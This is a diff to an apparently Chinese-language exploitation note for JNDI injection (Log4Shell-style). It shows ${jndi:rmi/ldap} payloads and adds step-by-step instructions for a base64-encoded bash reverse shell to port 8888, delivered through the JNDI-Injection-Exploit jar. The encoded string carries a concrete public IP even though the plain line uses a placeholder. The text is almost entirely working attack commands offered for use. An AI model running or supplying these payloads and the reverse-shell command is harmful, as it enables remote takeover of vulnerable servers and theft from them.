@@ -81,5 +81,12 @@ java8 -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc"
 
 ${jndi:rmi://192.168.1.8:1099/yfwrr7}
 ${jndi:ldap://192.168.1.8:2113/akndj}
+
+
+注意反弹shell命令需要base64编码
+bash -i >& /dev/tcp/（你服务器的公网IP地址）/8888（监听的端口号，我这里使用的是8888端口） 0>&1
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzYuMjMxLjczLzg4ODggMD4mMQ==（这是上一行代码的base64编码）
+
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzYuMjMxLjczLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}" -A "（你服务器的公网IP地址）"
 ```
 
